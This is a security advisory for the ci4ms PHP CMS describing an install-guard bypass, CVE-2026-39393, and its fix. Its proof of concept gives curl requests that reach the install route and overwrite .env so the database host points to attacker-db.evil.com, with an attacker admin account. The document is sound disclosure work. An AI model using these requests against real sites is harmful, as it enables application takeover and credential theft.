# [H] CI4MS Vulnerable to Post-Installation Re-entry via Cache-Dependent Install Guard Bypass

## Summary
Severity: High
Advisory: GHSA-8rh5-4mvx-xj7j
CVE: CVE-2026-39393
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-8rh5-4mvx-xj7j
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The install route guard in ci4ms relies solely on a volatile cache check (`cache('settings')`) combined with `.env` file existence to block post-installation access to the setup wizard. When the database is temporarily unreachable during a cache miss (TTL expiry or admin-triggered cache clear), the guard fails open, allowing an unauthenticated attacker to overwrite the `.env` file with attacker-controlled database credentials, achieving full application takeover.

## Details

The `InstallFilter::before()` method at `modules/Install/Filters/InstallFilter.php:13` implements the install guard:

```php
public function before(RequestInterface $request, $arguments = null)
{
    if (file_exists(ROOTPATH . '.env') && !empty(cache('settings'))) return show_404();
}
```

This requires **both** conditions — `.env` existence AND non-empty cache — to block access. The cache population happens in `app/Config/Filters.php:128-151` during the Filters constructor, which runs before route-specific filters:

```php
public function __construct()
{
    parent::__construct();
    if (is_file(ROOTPATH . '.env')) {
        try {
            $this->commonModel = new CommonModel();
            if (empty(cache('settings')) && $this->commonModel->db->tableExists('settings')) {
                $this->settings = $this->commonModel->lists('settings');
                // ... populate cache ...
                cache()->save('settings', $set, 86400); // 24h TTL
            }
        } catch (\Throwable $e) {
            $this->settings = (object)[]; // Silently swallow ALL exceptions
        }
    }
```

When the database is unreachable (connection failure, timeout, maintenance), the `\Throwable` catch at line 148-150 silently swallows the exception. The cache remains empty, and `InstallFilter::before()` sees `empty(cache('settings'))` as true, allowing the request through.

The install controller at `modules/Install/Controllers/Install.php:10-87` then processes the POST:

1. The `host` parameter at line 35 is **not present in the validation rules** (`$valData`, lines 13-27) — it is written directly from `$this->request->getPost('host')` to `.env` with zero validation
2. `copyEnvFile()` (line 70) overwrites the existing `.env` by copying from the `env` template
3. `updateEnvSettings()` (line 70) writes attacker-controlled values including database hostname
4. No database connection is needed — the `index()` action only performs filesystem operations

Additionally, CSRF protection is explicitly disabled for all install routes in `modules/Install/Config/InstallConfig.php:7-10`:

```php
public $csrfExcept = [
    'install',
    'install/*'
];
```

The cache has a 24-hour TTL (`Filters.php:143`), and `cache()->delete('settings')` is called in 14+ locations across admin controllers (Settings, Blog, Backup, AJAX, Pages), creating recurring windows where the cache is empty and must be repopulated from the database.

## PoC

**Prerequisites:** The target database must be temporarily unreachable (maintenance window, connection exhaustion, network partition) at a moment when the `settings` cache has expired or been cleared.

```bash
# Step 1: Verify the install route is accessible (DB outage + cache miss)
curl -s -o /dev/null -w "%{http_code}" http://target/install
# Expected: 200 (instead of 404)

# Step 2: Overwrite .env with attacker-controlled database credentials
curl -X POST http://target/install \
  -d 'baseUrl=http://target/' \
  -d 'host=attacker-db.evil.com' \
  -d 'dbname=ci4ms' \
  -d 'dbusername=root' \
  -d 'dbpassword=pass' \
  -d 'dbdriver=MySQLi' \
  -d 'dbpre=' \
  -d 'dbport=3306' \
  -d 'name=Admin' \
  -d 'surname=Evil' \
  -d 'username=admin' \
  -d 'password=Evil1234!' \
  -d 'email=evil@attacker.com' \
  -d 'siteName=Pwned'
# No CSRF token required (CSRF exempt for install routes)
# .env is now overwritten with attacker's DB hostname

# Step 3: Follow redirect to /install/dbsetup
# This runs migrations on the attacker-controlled database and creates an admin account
# The application now connects to attacker's database = full takeover
```

## Impact

When exploited during a database outage coinciding with cache expiry:

- **Full application takeover**: The `.env` file is overwritten with attacker-controlled database credentials, redirecting all application database queries to an attacker-controlled server
- **Credential theft**: All subsequent user logins, form submissions, and API calls send data to the attacker's database
- **Data integrity loss**: The attacker controls what data the application reads from the database, enabling arbitrary content injection, phishing, and privilege escalation
- **Encryption key reset**: `generateEncryptionKey()` is called (line 70), invalidating all existing encrypted data and sessions

The attack requires no authentication, no CSRF token, and no user interaction. The exploitability window recurs every 24 hours at cache TTL expiry and after any admin action that clears the settings cache, but is only exploitable when the database is simultaneously unreachable.

## Recommended Fix

Replace the volatile cache-based install guard with a persistent filesystem lock:

```php
// modules/Install/Filters/InstallFilter.php
class InstallFilter implements FilterInterface
{
    public function before(RequestInterface $request, $arguments = null)
    {
        // Use a persistent filesystem lock instead of volatile cache
        if (file_exists(WRITEPATH . 'installed.lock')) {
            return show_404();
        }
    }
}
```

Create the lock file at the end of successful installation in `Install::dbsetup()`:

```php
// At the end of dbsetup(), after successful migration and setup:
file_put_contents(WRITEPATH . 'installed.lock', date('Y-m-d H:i:s'));
```

Additionally, add validation for the `host` parameter in `Install::index()`:

```php
$valData['host'] = [
    'label' => lang('Install.databaseHost'),
    'rules' => 'required|max_length[255]|regex_match[/^[a-zA-Z0-9._-]+$/]'
];
```

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-8rh5-4mvx-xj7j
- https://nvd.nist.gov/vuln/detail/CVE-2026-39393
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
